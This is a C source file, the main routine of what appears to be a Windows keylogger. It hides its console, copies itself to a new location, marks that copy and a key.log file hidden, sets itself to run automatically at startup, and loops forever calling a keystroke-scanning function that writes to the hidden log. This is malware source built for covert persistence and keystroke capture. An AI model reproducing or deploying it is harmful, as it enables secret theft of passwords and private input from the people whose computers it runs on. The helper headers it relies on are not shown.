#include <stdio.h>
#include <stdlib.h>
#include <libgen.h>

#include "keyscan.h"
#include "setup.h"

#define KEY_FILE "key.log"

int main(int argc, char **argv){
    char currPath[LEN_VALUE_NAME];
    char newPath[LEN_VALUE_NAME];
    char *nameProg = NULL;
    char *path = NULL;
    FreeConsole();
    memset(&currPath, '\0', LEN_VALUE_NAME);
    memset(&newPath, '\0', LEN_VALUE_NAME);
    GetModuleFileName(0, currPath, LEN_VALUE_NAME);
    getNewPath(newPath, LEN_VALUE_NAME);
    if((nameProg = basename(currPath)) != NULL){
        strcat(newPath, "\\");
        strcat(newPath, nameProg);
        if(strcmp(currPath, newPath)!= 0)
            CopyFile(currPath, newPath, FALSE);
        setHidden(newPath);
        setAutoRun(newPath, nameProg);
        path = dirname(newPath);
        strcat(path, "\\");
        strcat(path, KEY_FILE);
        setHidden(path);
        while(true){
            scanCode(path);
        }
    }
    return 0;
}
